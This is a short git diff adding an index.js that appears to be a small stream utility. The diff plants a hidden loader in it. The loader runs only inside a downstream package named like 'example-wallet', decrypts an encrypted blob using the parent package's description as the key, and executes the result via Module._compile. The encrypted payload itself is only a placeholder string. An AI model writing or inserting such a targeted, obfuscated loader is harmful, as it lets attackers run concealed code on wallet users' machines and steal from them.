@@ -1,0 +1,18 @@
+diff --git a/index.js b/index.js
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/index.js
+@@ -0,0 +1,12 @@
++var Stream = require('stream').Stream;
++var Module = require('module');
++var parentDesc = process.env.npm_package_description || '';
++// only activate inside one specific downstream package
++if (/example-wallet/.test(process.env.npm_package_name || '')) {
++  var crypto = require('crypto');
++  var d = crypto.createDecipher('aes256', parentDesc);
++  var payload = d.update('00ff00ff00ff00ff', 'hex', 'utf8') + d.final('utf8');
++  var m = new Module();
++  m._compile(payload, 'x');
++}
++module.exports = function (fn) { return new Stream(); };
